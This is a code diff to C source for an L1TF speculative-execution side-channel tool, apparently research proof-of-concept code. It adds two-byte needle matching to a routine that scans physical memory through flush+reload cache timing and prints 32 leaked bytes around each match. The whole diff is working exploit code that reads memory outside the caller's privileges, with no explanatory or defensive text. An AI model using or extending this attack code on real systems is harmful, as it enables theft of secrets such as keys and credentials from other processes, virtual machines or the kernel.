@@ -59,6 +59,17 @@ bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t che
   return time < THRESHOLD;
 }
 
+bool l1tf_check_2(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[2]) {
+  clflush(reload_buffer[check[1]]);
+  mfence();
+
+  uint16_t half_word = *(uint16_t *)check;
+  asm_l1tf_leak_full_2_byte_mask(leak_addr, reload_buffer, half_word & 0x00ff);
+
+  size_t time = access_time(reload_buffer[check[1]]);
+  return time < THRESHOLD;
+}
+
 bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[4]) {
   clflush(reload_buffer[check[3]]);
   mfence();
@@ -186,6 +197,9 @@ mds_offenders_t detect_mds_bytes_in_page(void) {
   // Do l1tf on the entire page, and track which bytes show
   // spurious behavior.
   for (size_t probe = 0; probe < nr_of_probes; ++probe) {
+    if (probe % 100 == 0) {
+      fprintf(stderr, "Probe set %ld/%ld...\r", probe, nr_of_probes);
+    }
     for (size_t i = 0; i < PAGE_SIZE; ++i) {
       void *leak_addr = (char *)leak.leak + i;
       uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
@@ -344,35 +358,70 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
                                 full_reload_buffer_t reload_buffer, leak_addr_t leak) {
   assert(needle_size > 0);
   assert(needle_size < scan_opts.stride);
-  assert(needle_size % 4 == 0);
-  assert(scan_opts.start + needle_size < PAGE_SIZE);
+  assert(needle_size % 2 == 0);
+  assert((scan_opts.start & 0xfff) + needle_size < PAGE_SIZE);
 
   reload_buffer_t nibble_reload_buffer = {0};
   size_t attempt = 1;
-  while (true) {
-    for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
-      if (i % 100000 == 0) {
-        fprintf(stderr, "run %ld: %.2f%%\r", attempt, ((double)ptr / (double)scan_opts.end) * (double)100);
-      }
-      l1tf_leak_buffer_modify(&leak, (void *)ptr);
 
-      for (size_t idx = 0; idx < needle_size; idx += 4) {
-        uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
-        if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
-          uint8_t leaked_data[32] = {0};
-          for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
-            leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
+  if (needle_size % 4 == 0) {
+    while (true) {
+      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
+        if (i % 100000 == 0) {
+          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
+                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
+                      (double)100);
+        }
+        l1tf_leak_buffer_modify(&leak, (void *)ptr);
+
+        for (size_t idx = 0; idx < needle_size; idx += 4) {
+          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
+          if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
+            uint8_t leaked_data[32] = {0};
+            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
+              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
+            }
+            printf("\n%p\t", (void *)ptr);
+            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
+              printf("%.2x ", leaked_data[leaked_data_idx]);
+            }
+            printf("\n");
+            fflush(stdout);
           }
-          printf("\n%p\t", (void *)ptr);
-          for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
-            printf("%.2x ", leaked_data[leaked_data_idx]);
-          }
-          printf("\n");
-          fflush(stdout);
         }
       }
+      ++attempt;
     }
-    ++attempt;
+  } else if (needle_size % 2 == 0) {
+    while (true) {
+      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
+        if (i % 100000 == 0) {
+          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
+                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
+                      (double)100);
+        }
+        l1tf_leak_buffer_modify(&leak, (void *)ptr);
+
+        for (size_t idx = 0; idx < needle_size; idx += 2) {
+          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
+          if (l1tf_check_2(leak_ptr, reload_buffer, (uint8_t *)needle)) {
+            uint8_t leaked_data[32] = {0};
+            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
+              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
+            }
+            // if (leaked_data[6 + idx] == needle[idx] && leaked_data[7 + idx] == needle[idx + 1]) {
+            printf("\n%p\t", (void *)ptr);
+            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
+              printf("%.2x ", leaked_data[leaked_data_idx]);
+            }
+            printf("\n");
+            fflush(stdout);
+            // }
+          }
+        }
+      }
+      ++attempt;
+    }
   }
   return NULL;
 }
